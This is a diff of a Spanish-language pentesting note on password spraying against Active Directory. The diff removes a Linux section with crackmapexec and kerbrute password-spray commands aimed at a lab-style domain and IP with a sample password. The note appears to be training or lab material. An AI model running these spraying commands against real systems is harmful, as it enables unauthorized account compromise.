@@ -22,13 +22,3 @@ De manera automática va a generar una lista de usuarios del AD, ver las políti
 
 Podemos usar la flag -Admin para que solo pruebe con usuarios administradores.
 
-
-# Desde linux
-
-### Crackmapexec
-
-    crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
-
-### Kerbrute
-
-    kerbrute passwordspray -d corp.com usernames.txt "Nexus123!"
